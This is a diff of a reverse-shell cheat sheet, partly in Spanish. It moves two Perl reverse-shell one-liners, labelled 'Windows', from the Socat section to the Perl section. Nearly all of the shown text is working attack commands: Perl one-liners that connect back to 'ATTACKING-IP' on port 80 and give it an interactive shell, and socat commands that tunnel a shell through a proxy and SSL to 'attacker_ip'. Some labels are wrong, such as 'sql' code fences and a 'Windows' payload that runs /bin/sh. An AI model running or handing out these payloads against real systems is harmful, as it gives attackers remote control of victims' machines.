@@ -187,7 +187,15 @@ perl —e 'exec "/bin/sh";'
 ```sql
     perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
+- Windows
+	```sql
+	perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+	```
 
+- Windows
+	```sql
+	perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+	```
 ## **Socat**
 - Reverse shell a través de proxy y encapsulada en SSL:
 ```bash
@@ -200,15 +208,7 @@ cctrl=attacker_ip
 socat TCP-LISTEN:44443,reuseaddr,fork,bind=127.0.0.1 PROXY:$proxy:$cctrl:443,proxyport=80
 socat TCP-LISTEN:55522,reuseaddr,fork,bind=127.0.0.1 OPENSSL:127.0.0.1:44443,verify=0
 ```
-- Windows
-	```sql
-	perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-	```
 
-- Windows
-	```sql
-	perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-	```
 ## Socat
 
 ### Client
